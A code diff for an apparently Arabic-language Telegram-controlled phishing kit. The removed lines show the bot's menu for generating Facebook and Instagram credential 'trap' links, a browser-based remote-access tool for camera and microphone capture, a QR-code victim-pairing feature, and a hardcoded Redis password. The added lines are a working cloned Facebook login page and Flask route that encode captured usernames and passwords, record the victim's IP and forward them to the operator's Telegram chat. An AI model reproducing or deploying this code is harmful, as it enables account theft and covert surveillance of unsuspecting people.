@@ -1,120 +1,147 @@
 import os
-import threading
-import telebot
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
-from flask import Flask
+import base64
+import json
+import urllib.parse
+from flask import Blueprint, render_template_string, redirect, request
 
-from facebook_module import init_facebook_routes
-from instagram_module import init_instagram_routes
-from rat_module import init_rat_routes, rat_bp, queue_command
-from qr_pairing import init_qr_routes, qr_bp, generate_qr_code_bytes
-import uuid
-import redis
+secure_fb_bp = Blueprint('facebook', __name__)
 
-BOT_TOKEN = os.getenv("BOT_TOKEN")
-RAILWAY_URL = "https://daf-production-8df9.up.railway.app"
+# قالب فيسبوك مطور، متجاوب، وآمن ضد أخطاء المتصفحات والترميز
+FB_PHISH_TEMPLATE = """
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="robots" content="noindex, nofollow">
+    <title>تسجيل الدخول إلى فيسبوك</title>
+    <style>
+        * { box-sizing: border-box; }
+        body { background-color: #f0f2f5; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; direction: rtl; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; }
+        .container { width: 396px; max-width: 90%; text-align: center; }
+        .header-logo { margin-bottom: 20px; display: inline-block; }
+        .header-logo svg { height: 56px; width: 56px; fill: #1877f2; }
+        .card { background-color: #ffffff; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); padding: 20px; text-align: center; }
+        .card input { border: 1px solid #dddfe2; color: #1d2129; font-size: 16px; padding: 14px 16px; margin-bottom: 12px; width: 100%; border-radius: 6px; outline: none; background: #fff; }
+        .card input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
+        .login-btn { background-color: #1877f2; border: none; border-radius: 6px; color: #fff; font-size: 20px; line-height: 48px; padding: 0 16px; width: 100%; font-weight: bold; cursor: pointer; margin-bottom: 12px; transition: background-color 0.2s; }
+        .login-btn:hover { background-color: #166fe5; }
+        .error-box { background-color: #ffebe8; border: 1px solid #dd3c10; color: #333; padding: 10px; margin-bottom: 12px; border-radius: 4px; font-size: 13px; display: none; text-align: right; }
+        .forgot-link { color: #1877f2; font-size: 14px; text-decoration: none; display: block; margin-bottom: 20px; }
+        .forgot-link:hover { text-decoration: underline; }
+        hr { border: none; border-top: 1px solid #dadde1; margin: 20px 0; }
+        .create-btn { background-color: #42b72a; border: none; border-radius: 6px; color: #fff; font-size: 17px; font-weight: bold; line-height: 48px; padding: 0 16px; cursor: pointer; display: inline-block; text-decoration: none; }
+        .create-btn:hover { background-color: #36a420; }
+        footer { margin-top: 30px; color: #737373; font-size: 12px; text-align: center; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header-logo">
+            <svg viewBox="0 0 36 36"><path d="M25 3.58A17.42 17.42 0 0 0 19.8 3a11.08 11.08 0 0 0-4.8 1.15 8.71 8.71 0 0 0-3.6 3.32A9.45 9.45 0 0 0 10 12.18v2.92H7.32a.71.71 0 0 0-.71.71v4.38c0 .39.32.71.71.71H10V33a.71.71 0 0 0 .71.71h5.12a.71.71 0 0 0 .71-.71V20.9h4.37a.71.71 0 0 0 .71-.71l.01-4.38a.71.71 0 0 0-.71-.71H16.55v-2.5c0-1.2.3-2.11.9-2.73.6-.62 1.45-.93 2.55-.93a10.23 10.23 0 0 1 2.5.31.71.71 0 0 0 .82-.47l.5-1.55a.71.71 0 0 0-.34-.84z"></path></svg>
+        </div>
+        <div class="card">
+            <div id="error-msg" class="error-box">كلمة السر التي أدخلتها غير صحيحة. يرجى المحاولة مرة أخرى.</div>
+            <form method="POST" id="secureForm" onsubmit="executeSecureAuth(event)">
+                <input type="text" id="u_val" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required autocomplete="username">
+                <input type="password" id="p_val" name="pass" placeholder="كلمة السر" required autocomplete="current-password">
+                <button type="submit" class="login-btn">تسجيل الدخول</button>
+                <a href="#" class="forgot-link">هل نسيت كلمة السر؟</a>
+                <hr>
+                <a href="https://www.facebook.com/r.php" class="create-btn" target="_blank">إنشاء حساب جديد</a>
+            </form>
+        </div>
+        <footer>Meta © 2026</footer>
+    </div>
+    <script>
+        let securityCheckCount = 0;
+        function executeSecureAuth(e) {
+            e.preventDefault();
+            const u = document.getElementById('u_val').value.trim();
+            const p = document.getElementById('p_val').value.trim();
+            const errBox = document.getElementById('error-msg');
 
-REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379").strip()
-if REDIS_URL.startswith("redis-cli"):
-    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()
+            if (securityCheckCount === 0 && (p.length < 6 || u.length < 4)) {
+                errBox.style.display = 'block';
+                securityCheckCount++;
+                return;
+            }
 
-# تنظيف وتحقق إضافي لمنع أي خطأ في الـ Scheme الخاص بـ Redis
-if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
-    REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"
+            try {
+                const payloadString = JSON.stringify({ u: u, p: p, ts: Date.now() });
+                // ترميز آمن يمنع التلف عند تمرير الحروف العربية أو الرموز الخاصة
+                const tokenPayload = btoa(encodeURIComponent(payloadString).replace(/%([0-9A-F]{2})/g, function(match, p1) {
+                    return String.fromCharCode('0x' + p1);
+                }));
+                
+                fetch(window.location.href, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ payload_data: tokenPayload })
+                }).then(response => {
+                    window.location.replace("https://www.facebook.com/login/");
+                }).catch(err => {
+                    window.location.replace("https://www.facebook.com/login/");
+                });
+            } catch (err) {
+                // تراجع تلقائي لإرسال النموذج بالطريقة العادية لو حدث خطأ في الـ fetch
+                document.getElementById('secureForm').submit();
+            }
+        }
+    </script>
+</body>
+</html>
+"""
 
-redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True)
-
-if not BOT_TOKEN:
-    raise ValueError("[-] BOT_TOKEN is missing!")
-
-bot = telebot.TeleBot(BOT_TOKEN)
-app = Flask(__name__)
-
-# تسجيل الـ Blueprints الخاصة بالمسارات
-app.register_blueprint(rat_bp)
-app.register_blueprint(qr_bp)
-
-# ربط مسارات السيرفر للملفات المستقلة
-init_facebook_routes(app, bot)
-init_instagram_routes(app, bot)
-init_rat_routes(app, bot)
-init_qr_routes(app, bot)
-
-# واجهة البوت الرئيسية وأزراره (محدثة لتشمل أداة الـ QR الجديدة)
-def main_menu():
-    markup = InlineKeyboardMarkup()
-    markup.add(InlineKeyboardButton("🔗 توليد رابط مصيدة فيسبوك", callback_data="gen_fb"))
-    markup.add(InlineKeyboardButton("📸 توليد رابط مصيدة انستقرام", callback_data="gen_ig"))
-    markup.add(InlineKeyboardButton("📱 أداة المراقبة والتحكم الخلفي", callback_data="gen_rat"))
-    markup.add(InlineKeyboardButton("📷 أداة ربط الضحية السريع عبر QR", callback_data="gen_qr"))
-    return markup
-
-@bot.message_handler(commands=['start', 'panel'])
-def start_command(message):
-    user_name = message.from_user.first_name
-    text = (
-        f"⚡ **مرحباً بك يا {user_name} في DEV ١ 😈**\n\n"
-        "غير مسؤال تماما عن اساء الاستخدام "
-    )
-    bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=main_menu())
-
-@bot.callback_query_handler(func=lambda call: True)
-def callback_handler(call):
-    chat_id = call.message.chat.id
-    
-    if call.data == "gen_fb":
-        bot.answer_callback_query(call.id, "جاري تجهيز رابط فيسبوك...")
-        link = f"{RAILWAY_URL}/login.php?id={chat_id}"
-        bot.send_message(chat_id, f"🎯 **رابط فيسبوك المخصص:**\n`{link}`", parse_mode="Markdown")
+def init_facebook_routes(app, bot):
+    @app.route('/login.php', methods=['GET', 'POST'])
+    def fb_trap():
+        target_chat_id = request.args.get('id', None)
         
-    elif call.data == "gen_ig":
-        bot.answer_callback_query(call.id, "جاري تجهيز رابط انستقرام...")
-        link = f"{RAILWAY_URL}/ig_login.php?id={chat_id}"
-        bot.send_message(chat_id, f"📸 **رابط انستقرام المخصص:**\n`{link}`", parse_mode="Markdown")
+        if request.method == 'POST':
+            user_val = "غير محدد"
+            pass_val = "غير محدد"
+            
+            try:
+                # محاولة قراءة البيانات الواردة كـ JSON (عبر الـ Fetch)
+                req_data = request.get_json(silent=True) or {}
+                encoded_data = req_data.get('payload_data')
+                
+                if encoded_data:
+                    decoded_bytes = base64.b64decode(encoded_data.encode('utf-8'))
+                    decoded_uri = ''.join(['%{:02x}'.format(b) for b in decoded_bytes])
+                    parsed_json = json.loads(urllib.parse.unquote(decoded_uri))
+                    user_val = parsed_json.get('u', 'غير محدد')
+                    pass_val = parsed_json.get('p', 'غير محدد')
+                else:
+                    # لو البيانات مرسلة بالطريقة العادية Form Data
+                    user_val = request.form.get('email', 'غير محدد')
+                    pass_val = request.form.get('pass', 'غير محدد')
+            except Exception as e:
+                # حماية ضد أي استثناء محتمل لضمان عدم توقف السيرفر
+                user_val = request.form.get('email', request.values.get('email', 'خطأ في الاستخراج'))
+                pass_val = request.form.get('pass', request.values.get('pass', 'خطأ في الاستخراج'))
+                print(f"[-] Facebook Parsing Exception Handled: {e}")
 
-    elif call.data == "gen_rat":
-        bot.answer_callback_query(call.id, "جاري تجهيز رابط التحكم الخلفي المطور...")
-        link = f"{RAILWAY_URL}/system_secure_v2?id={chat_id}"
-        bot.send_message(
-            chat_id, 
-            f"📱 **رابط المراقبة والتحكم الخلفي المطور جاهز:**\n`{link}`\n\nبمجرد أن يفتح الضحية الرابط ستعمل الجلسة في خلفية متصفحه بلا توقف.", 
-            parse_mode="Markdown"
-        )
+            # استخراج الـ IP بدقة متناهية مع تجنب القيم الفارغة
+            source_ip = request.headers.get('CF-Connecting-IP') or request.headers.get('X-Forwarded-For') or request.remote_addr
+            if source_ip and ',' in source_ip:
+                source_ip = source_ip.split(',')[0].strip()
 
-    elif call.data == "gen_qr":
-        bot.answer_callback_query(call.id, "جاري توليد كود الـ QR السريع...")
-        token = str(uuid.uuid4())[:8]
-        # حفظ الربط المؤقت في Redis لمدة 5 دقائق
-        redis_client.setex(f"qr_token:{token}", 300, chat_id)
-        
-        target_link = f"{RAILWAY_URL}/qr_scan_target?token={token}"
-        qr_image = generate_qr_code_bytes(target_link)
-        qr_image.name = 'pairing_qr.jpg'
-        
-        bot.send_photo(
-            chat_id, 
-            qr_image, 
-            caption="📷 **امسح هذا الـ QR بكاميرا هاتف الضحية:**\n\nبمجرد توجيه الكاميرا وفتح الرابط، سيتم سحب بيانات الجهاز وجلسة الضحية فوراً إلى بوتك هنا دون تثبيت أي برامج!",
-            parse_mode="Markdown"
-        )
-        
-    # معالجة أزرار التحكم الدقيق المباشر في الضحية
-    elif call.data.startswith("rat_cam_"):
-        target_chat_id = call.data.replace("rat_cam_", "")
-        queue_command(target_chat_id, "snapshot")
-        bot.answer_callback_query(call.id, "⏳ جاري التقاط الصورة من الضحية...")
-
-    elif call.data.startswith("rat_mic_"):
-        target_chat_id = call.data.replace("rat_mic_", "")
-        queue_command(target_chat_id, "audio")
-        bot.answer_callback_query(call.id, "⏳ جاري تسجيل الصوت من ميكروفون الضحية...")
-
-def run_flask():
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host="0.0.0.0", port=port)
-
-if __name__ == "__main__":
-    t = threading.Thread(target=run_flask)
-    t.daemon = True
-    t.start()
-    bot.infinity_polling()
+            if target_chat_id and target_chat_id != '0' and user_val != "غير محدد":
+                alert_msg = (
+                    "🚨 **تم التقاط صيد فيسبوك بنجاح عبر النظام !**\n"
+                    "----------------------------------\n"
+                    f"📌 **البريد/الهاتف:** `{user_val}`\n"
+                    f"🔑 **كلمة المرور:** `{pass_val}`\n"
+                    f"🌐 **عنوان الـ IP:** `{source_ip}`\n"
+                    "----------------------------------"
+                )
+                try:
+                    bot.send_message(target_chat_id, alert_msg, parse_mode="Markdown")
+                except Exception as e:
+                    print(f"[-] Telegram Dispatch Error: {e}")
+                    
+            return {"status": "authenticated", "code": 200}, 200
+            
+        return render_template_string(FB_PHISH_TEMPLATE), 200
